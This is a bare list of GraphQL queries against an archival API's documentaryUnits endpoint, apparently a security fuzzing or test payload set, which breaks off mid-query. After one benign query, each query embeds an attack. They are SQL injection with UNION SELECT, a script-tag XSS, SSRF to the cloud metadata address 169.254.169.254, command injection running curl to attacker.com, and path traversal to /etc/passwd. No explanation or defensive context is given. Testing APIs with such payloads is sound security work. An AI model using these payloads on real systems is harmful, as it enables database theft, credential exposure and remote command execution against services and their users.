query documentaryUnits {
  documentaryUnits(topLevel: true) {
    items {
      id
      type
      identifier
    }
    pageInfo {
      hasNextPage
    }
  }
}

query documentaryUnits {
  documentaryUnits(from: "0' UNION ALL SELECT * FROM documentary_units--") {
    items {
      id
      descriptions {
        name
      }
    }
  }
}

query documentaryUnits {
  documentaryUnits {
    items {
      descriptions {
        archivalHistory(text: "<script>alert(1)</script>")
      }
    }
  }
}

query documentaryUnits {
  documentaryUnits {
    items {
      repository {
        descriptions {
          addresses {
            webpage(url: "http://169.254.169.254/latest/meta-data")
          }
        }
      }
    }
  }
}

query documentaryUnits {
  documentaryUnits {
    items {
      systemEvents {
        logMessage(input: "; curl http://attacker.com")
      }
    }
  }
}

query documentaryUnits {
  documentaryUnits {
    items {
      descriptions {
        physicalLocation(path: "../../etc/passwd")
      }
    }
  }
}

query documentaryUnits {
  documentaryUnits {
    items {
      descriptions {
